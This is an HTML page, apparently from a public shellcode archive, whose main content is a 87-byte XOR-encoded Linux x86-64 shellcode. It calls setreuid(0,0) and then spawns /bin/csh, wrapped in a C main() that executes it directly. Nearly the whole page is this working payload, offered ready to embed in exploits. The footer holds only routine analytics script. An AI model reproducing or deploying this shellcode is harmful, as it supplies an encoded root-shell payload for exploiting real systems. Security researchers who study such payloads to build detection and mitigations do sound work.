<html><head><title>Linux/x86-64 - Linux x86-64 setreuid (0,0) &amp; execve(/bin/csh, [/bin/csh, NULL]) + XOR encoded - 87 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
# Title: Linux x86-64 setreuid (0,0) &amp; execve(&quot;/bin/csh&quot;, [&quot;/bin/csh&quot;, NULL]) + XOR encoded - 87 bytes
# Author: egeektronic &lt;info (at) egeektronic {dot} com&gt;
# Twitter: @egeektronic
# Tested on: Slackware 13.37
# Thanks: Mark Loiseau, entropy [at] phiral.net and metasm developer

unsigned char shellcode[] = 
&quot;\x4d\x31\xc0\x41\xb1\xe3\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb&quot;
&quot;\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48&quot;
&quot;\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\xab\xd2\x23\xab\x60\x23&quot;
&quot;\x92\xab\xd2\x1c\xab\xd2\x15\xec\xe6\x08\xf1\xab\xd2\x23\xab&quot;
&quot;\x60\x23\xd8\xbc\xab\xd2\x31\xb1\xb4\xab\x6a\x05\xec\xe6\x0b&quot;
&quot;\x0a\x1c\x1c\x1c\xcc\x81\x8a\x8d\xcc\x80\x90\x8b&quot;;                                     
int main(void) { ((void (*)())shellcode)(); }

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
